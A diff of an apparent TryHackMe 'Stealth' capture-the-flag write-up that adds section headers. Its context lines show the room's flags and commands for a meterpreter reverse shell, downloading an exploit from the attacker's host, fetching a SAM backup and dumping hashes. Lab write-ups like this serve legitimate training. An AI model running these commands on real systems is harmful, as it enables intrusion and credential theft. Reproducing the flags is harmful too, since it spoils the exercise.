@@ -3,7 +3,7 @@
 + What is the content of the user level flag? `THM{1010_EVASION_LOCAL_USER}`
 + What is the content of the root level flag? `THM{101011_ADMIN_ACCESS}`
 
-
+## Enumeration 
 + Open the browser and create some payload to reverse shell using `powershell` with extention `ps1`
    - The shell will checking the virus code
 + Listen for revershell 
@@ -60,6 +60,7 @@
    msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost 10.4.37.160; set lport 1235; exploit"
    ```
 
+## Exploitation
    - After got reverseshell try upload file to target machine
    ```bash
    curl http://10.4.37.160:83/exploit.cs -o exploit.cs
@@ -84,6 +85,7 @@
    wget http://10.10.2.227:8080/sam.bak
    ```
 
+## Privilege Escalation
    - Try to dump the hash file using `impacket-secretdump` from file we download
    ```bash
    ┌──(lodwig㉿kali)-[~/Documents/THM/Stealth]
